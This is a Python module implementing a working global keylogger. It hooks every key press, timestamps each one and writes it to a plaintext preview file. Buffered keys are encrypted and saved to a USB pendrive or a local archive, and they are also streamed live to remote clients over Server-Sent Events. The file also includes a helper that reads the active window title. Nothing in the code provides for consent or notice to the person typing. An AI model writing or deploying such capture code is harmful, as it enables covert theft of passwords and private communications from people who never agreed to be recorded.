"""
capture_controller.py

CaptureController: centralised keystroke capture manager.

This version forces using the 'keyboard' fallback on Python 3.13+ to avoid
pynput internal threading issues (_ThreadHandle callable error). It still
prefers pynput on older Python versions if available.
"""

import os
import threading
import time
import subprocess
import queue
import sys
from datetime import datetime, timezone
from typing import Optional

# --- helper to get active window title (non-critical) ---
def get_active_window_title():
    try:
        out = subprocess.check_output(
            ["xdotool", "getwindowfocus", "getwindowname"],
            stderr=subprocess.DEVNULL, text=True, timeout=0.2
        )
        return out.strip()
    except Exception:
        return "UNKNOWN"

# --- choose keyboard backend: prefer pynput on supported Python versions, fallback to keyboard ---
# Force-disable pynput for Python 3.13+ because of _ThreadHandle incompatibility.
USE_PYNPUT = False
_pynput_keyboard = None
_keyboard_fallback = None

if not (sys.version_info.major == 3 and sys.version_info.minor >= 13):
    # try to import pynput only on Python < 3.13
    try:
        from pynput import keyboard as _pynput_keyboard
        USE_PYNPUT = True
    except Exception:
        USE_PYNPUT = False

# Always try to import keyboard fallback (may require root to work on Linux)
try:
    import keyboard as _keyboard_fallback
except Exception:
    _keyboard_fallback = None

# --- project-specific imports ---
from encrypt_utils import encrypt_bytes
from device_monitor import is_connected, PENDRIVE_LOG_DIR, ensure_log_dir

# --- configuration ---
ARCHIVE_DIR = "archive"
FLUSH_INTERVAL = 8          # seconds; flush buffer to disk every FLUSH_INTERVAL
LIVE_QUEUE_MAX = 1024       # max items kept for SSE consumers

class CaptureController:
    def __init__(self):
        self._buffer = []               # buffered plaintext entries (to be flushed)
        self._lock = threading.Lock()   # guards _buffer
        self._live_q = queue.Queue(maxsize=LIVE_QUEUE_MAX)  # for SSE consumers (strings)
        self._capturing = False
        self._listener_thread: Optional[threading.Thread] = None
        self._flusher_thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._listener = None

    # ---------- key event handling ----------
    def _on_press_pynput(self, key):
        try:
            k = key.char
        except AttributeError:
            k = str(key).strip()
        self._push_key(k)

    def _on_press_keyboard(self, event):
        try:
            name = getattr(event, "name", str(event))
        except Exception:
            name = str(event)
        self._push_key(name)

    def _push_key(self, keyname: str):
        ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{ts}] {keyname}"
        with self._lock:
            self._buffer.append(entry)
        # non-blocking put to live queue
        try:
            self._live_q.put_nowait(entry)
        except queue.Full:
            try:
                _ = self._live_q.get_nowait()
                self._live_q.put_nowait(entry)
            except Exception:
                pass

        try:
            with open("live_preview.txt", "a") as f:
                f.write(entry + "\n")
        except Exception as e:
            print("[capture] live preview write error:", e)

        try:
            self._live_q.put_nowait(entry)
        except queue.Full:
            try:
                _ = self._live_q.get_nowait()
                self._live_q.put_nowait(entry)
            except Exception:
                pass
        print(f"[capture] live -> {keyname}")

    # ---------- listeners ----------
    def _run_listener(self):
        # If USE_PYNPUT True, try it first (only on older Python)
        if USE_PYNPUT and _pynput_keyboard is not None:
            try:
                with _pynput_keyboard.Listener(on_press=self._on_press_pynput) as listener:
                    self._listener = listener
                    listener.join()
                    return
            except Exception as e:
                print("[capture] pynput listener failed:", e)
                # fall through to keyboard fallback

        # keyboard fallback (preferred on Python 3.13+)
        self._run_keyboard_fallback()

    def _run_keyboard_fallback(self):
        if _keyboard_fallback is None:
            print("[capture] keyboard module not available, cannot capture")
            return
        try:
            print("[capture] using keyboard library fallback")
            _keyboard_fallback.on_press(self._on_press_keyboard)
            # keep alive until stop requested
            while not self._stop_event.is_set():
                time.sleep(0.1)
            try:
                _keyboard_fallback.unhook_all()
            except Exception:
                pass
        except Exception as e:
            print("[capture] keyboard fallback failed:", e)

    # ---------- flusher ----------
    def _flusher(self):
        while not self._stop_event.is_set():
            time.sleep(FLUSH_INTERVAL)
            with self._lock:
                if not self._buffer:
                    continue
                data = "\n".join(self._buffer).encode("utf-8")
                self._buffer.clear()

            try:
                enc = encrypt_bytes(data)
            except Exception as e:
                print("[capture] encryption failed:", e)
                continue

            fname = datetime.now(timezone.utc).strftime("keystrokes_%Y%m%d_%H%M%S.enc.bak")
            target_dir = ARCHIVE_DIR
            try:
                if is_connected():
                    ensure_log_dir()
                    target_dir = PENDRIVE_LOG_DIR
            except Exception:
                target_dir = ARCHIVE_DIR

            try:
                os.makedirs(target_dir, exist_ok=True)
            except Exception as e:
                print("[capture] cannot create target dir:", e)
                target_dir = ARCHIVE_DIR
                os.makedirs(target_dir, exist_ok=True)

            path = os.path.join(target_dir, fname)
            try:
                with open(path, "wb") as f:
                    f.write(enc)
                print(f"[agent] wrote {path}")
            except Exception as e:
                try:
                    fallback = os.path.join(ARCHIVE_DIR, fname)
                    os.makedirs(ARCHIVE_DIR, exist_ok=True)
                    with open(fallback, "wb") as f:
                        f.write(enc)
                    print(f"[agent] wrote fallback {fallback} (err: {e})")
                except Exception as final_err:
                    print("[capture] FAILED to write log:", final_err)

    # ---------- public control ----------
    def start(self):
        if self._capturing:
            return False
        self._stop_event.clear()
        self._listener_thread = threading.Thread(target=self._run_listener, daemon=True)
        self._listener_thread.start()
        self._flusher_thread = threading.Thread(target=self._flusher, daemon=True)
        self._flusher_thread.start()
        self._capturing = True
        print("[capture] started")
        return True

    def stop(self):
        if not self._capturing:
            return False
        self._stop_event.set()
        try:
            if self._listener and hasattr(self._listener, "stop"):
                self._listener.stop()
        except Exception:
            pass
        try:
            if _keyboard_fallback is not None:
                _keyboard_fallback.unhook_all()
        except Exception:
            pass
        self._capturing = False
        print("[capture] stopped")
        return True

    def is_running(self):
        return self._capturing

    # SSE support: generator yielding live updates
    def stream_live(self):
        """Generator that yields Server-Sent Events (SSE) from the live queue"""
        print("[controller] stream_live started")
        import sys
        try:
            while True:
                try:
                    item = self._live_q.get(timeout=1.0)
                    print("[controller] sending:", item)
                    sys.stdout.flush()
                    yield f"data: {item}\n\n"
                except queue.Empty:
                    yield ":\n\n"  # heartbeat
        except GeneratorExit:
            print("[controller] client disconnected")
            sys.stdout.flush()


# module-level default controller
controller = CaptureController()
